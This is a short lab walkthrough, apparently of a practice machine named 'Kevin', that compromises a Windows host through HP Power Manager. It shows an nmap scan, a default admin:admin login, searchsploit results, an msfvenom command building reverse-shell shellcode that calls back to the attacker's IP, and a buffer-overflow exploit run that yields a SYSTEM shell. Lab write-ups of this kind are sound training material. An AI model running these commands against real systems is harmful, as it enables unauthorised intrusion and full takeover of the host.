# Kevin

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.160.45
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 14:02 +08
Nmap scan report for 192.168.160.45
Host is up (0.17s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
```

### HP Power Manager --> RCE

Port 80 is running HP Power Manager and it looks vulnerable:

<figure><img src="../../../.gitbook/assets/image (3888).png" alt=""><figcaption></figcaption></figure>

`admin:admin` works in logging in:

<figure><img src="../../../.gitbook/assets/image (3887).png" alt=""><figcaption></figcaption></figure>

There are a couple of exploits available for this software:

```
$ searchsploit HP Power Manager
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Flying Dog Software Powerslave 4.3 Portalmanager - 'sql_id | php/webapps/23163.txt
Hewlett-Packard (HP) Power Manager Administration - Remote | windows/remote/16785.rb
Hewlett-Packard (HP) Power Manager Administration Power Ma | windows/remote/10099.py
HP Power Manager - 'formExportDataLogs' Remote Buffer Over | cgi/remote/18015.rb
----------------------------------------------------------- ---------------------------------
```

All of them are forms of Buffer Overflow, and I used `10099.py` to exploit it. FIrst, generate the shellcode needed with the bad characters and encoding given in the exploit:

{% code overflow="wrap" %}
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=4444 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed -f c
```
{% endcode %}

Then, replace the shellcode within the Python script and start a listener port.&#x20;

```
$ python2 10099.py 192.168.160.45
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.160.45:4444 , can take up to 1 min to spawn your shell
```

After running it, we would get a shell as the SYSTEM user:

![](<../../../.gitbook/assets/image (1104).png>)
